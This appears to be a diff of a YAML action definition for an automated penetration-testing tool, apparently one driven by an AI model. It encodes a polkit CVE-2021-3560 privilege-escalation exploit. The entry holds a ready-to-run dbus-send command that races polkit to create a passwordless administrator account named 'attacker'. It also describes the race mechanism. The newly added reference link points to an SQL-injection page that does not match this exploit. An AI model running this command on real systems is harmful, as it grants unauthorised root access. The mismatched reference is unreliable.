@@ -2,15 +2,20 @@ name: polkit_bypass
 category: privesc
 description: Polkit CVE-2021-3560 bypass
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "dbus-send --system --dest=org.freedesktop.Accounts --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:'Attacker' int32:1 & sleep 0.008s; kill $!"
+command_template: dbus-send --system --dest=org.freedesktop.Accounts --print-reply
+  /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:'Attacker'
+  int32:1 & sleep 0.008s; kill $!
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Polkit race condition: kill D-Bus message mid-flight → polkit treats as root request. Create admin user without password. Timing-sensitive, may need multiple attempts."
+mechanism: 'Polkit race condition: kill D-Bus message mid-flight → polkit treats as
+  root request. Create admin user without password. Timing-sensitive, may need multiple
+  attempts.'
+hacktricks_ref: pentesting-web/sql-injection/README.md
